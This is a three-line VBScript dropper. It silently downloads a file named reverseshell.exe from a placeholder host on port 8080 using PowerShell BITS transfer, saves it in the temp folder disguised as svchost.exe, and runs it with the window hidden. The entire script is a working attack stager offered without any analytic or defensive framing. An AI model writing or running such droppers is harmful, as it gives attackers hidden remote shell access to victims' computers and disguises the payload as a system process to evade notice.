
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "powershell -c Start-BitsTransfer -priority foreground -Source http://$ip:8080/reverseshell.exe -Destination $Env:TMP\svchost.exe -ErrorAction SilentlyContinue", 0, True
objShell.Run "cmd /c  %TMP%\svchost.exe", 0, True